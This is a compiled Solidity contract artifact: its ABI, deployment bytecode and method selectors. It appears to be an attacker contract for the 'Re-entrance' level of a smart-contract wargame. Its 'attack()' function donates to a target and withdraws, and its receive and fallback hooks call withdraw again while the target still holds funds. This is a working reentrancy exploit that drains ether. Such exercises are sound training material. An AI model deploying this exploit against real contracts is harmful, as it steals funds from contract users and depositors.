{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"fallback","stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"calls","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract ReentranceInterface"}],"stateMutability":"view"}],"bytecode":{"object":"0x60806040525f6001553480156012575f5ffd5b506040516102f73803806102f7833981016040819052602f916052565b5f80546001600160a01b0319166001600160a01b0392909216919091179055607d565b5f602082840312156061575f5ffd5b81516001600160a01b03811681146076575f5ffd5b9392505050565b61026d8061008a5f395ff3fe608060405260043610610037575f3560e01c8063022ec0951461010c578063305f72b7146101475780639e5faafc1461016a576100ba565b366100ba575f5466038d7ea4c680006001600160a01b039091163111156100b8575f54604051632e1a7d4d60e01b815266038d7ea4c6800060048201526001600160a01b0390911690632e1a7d4d906024015b5f604051808303815f87803b1580156100a1575f5ffd5b505af11580156100b3573d5f5f3e3d5ffd5b505050505b005b5f5466038d7ea4c680006001600160a01b039091163111156100b8575f54604051632e1a7d4d60e01b815266038d7ea4c6800060048201526001600160a01b0390911690632e1a7d4d9060240161008a565b348015610117575f5ffd5b505f5461012a906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b348015610152575f5ffd5b5061015c60015481565b60405190815260200161013e565b5f546040517e362a950000000000000000000000000000000000000000000000000000000081523060048201526100b8916001600160a01b03169062362a959034906024015f604051808303818588803b1580156101c6575f5ffd5b505af11580156101d8573d5f5f3e3d5ffd5b50505f54604051632e1a7d4d60e01b81523460048201526001600160a01b039091169350632e1a7d4d925060240190505f604051808303815f87803b15801561021f575f5ffd5b505af1158015610231573d5f5f3e3d5ffd5b5050505056fea2646970667358221220107865a08adcf2c0250cd7c917548df3d65833a29194c56a46edddfdde1aceb564736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","calls()":"305f72b7","instance()":"022ec095"},"id":0}